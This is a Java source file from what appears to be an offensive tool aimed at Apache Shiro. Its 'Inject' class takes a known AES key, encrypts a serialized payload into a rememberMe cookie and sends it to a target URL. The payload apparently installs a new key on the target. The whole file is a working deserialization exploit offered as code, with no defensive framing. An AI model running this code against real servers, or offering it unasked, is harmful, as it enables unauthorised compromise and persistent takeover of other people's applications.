package org.sec.core;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.util.ByteSource;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;


public class Inject {

    private static final Logger logger = LoggerFactory.getLogger(Inject.class);

    public static void start(OkHttpClient client, String url, String oldKey, String newKey) throws Exception {
        CipherService cipherService = new AesCipherService();
        Object privateObj = Payload.getPayload(newKey);
        byte[] privateBytes = Payload.serialize(privateObj);
        ByteSource privateSource = cipherService.encrypt(privateBytes, Base64.decode(oldKey));
        byte[] privateValue = privateSource.getBytes();
        String privateCookie = "rememberMe=" + Base64.encodeToString(privateValue);
        Request privateReq = new Request.Builder()
                .url(url)
                .addHeader("Cookie", privateCookie)
                .get()
                .build();
        Call privateCall = client.newCall(privateReq);
        Response response = privateCall.execute();
        response.close();
        logger.info("inject success");
    }
}
